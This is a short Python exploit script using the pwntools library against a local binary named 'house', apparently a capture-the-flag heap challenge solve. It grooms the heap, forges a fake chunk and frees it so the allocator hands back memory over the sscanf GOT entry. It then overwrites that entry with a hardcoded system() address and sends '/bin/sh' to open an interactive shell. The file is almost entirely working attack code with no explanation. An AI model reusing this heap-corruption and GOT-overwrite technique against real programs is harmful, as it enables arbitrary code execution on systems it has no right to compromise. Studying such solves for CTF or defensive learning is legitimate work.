from pwn import *
context.log_level="debug"
def add(name,description):
	p.sendline("1")
	p.sendline(name)
	p.sendline(description)
def recv():
	p.sendline("2")
def delect():
	p.sendline("3")
def mess(message):
	p.sendline("4")
	p.sendline(message);
p=process("./house")
i=0x40
p.recv()
sscanf_got=0x804a258
while(i>0):
	add(p32(0xdeadbeef),"12")
	i-=1
heapaddr=0x0804A2A4+0x4
payload="\0"*27+p32(heapaddr)
add(payload,p32(0x132132))
payload='\0'*0x24+'\x41'+"\x00\x00\x00"
mess(payload)
delect()
add(p32(sscanf_got),p32(sscanf_got))
sys_addr=0xf7e3fda0
mess(p32(sys_addr))
if True:
	gdb.attach(p,
	'''
	x/xw 0x0804A2A4
	x/xw 0x0804A2A4+0X44
	''')
p.sendline("/bin/sh")
p.interactive();
free=0x8048855

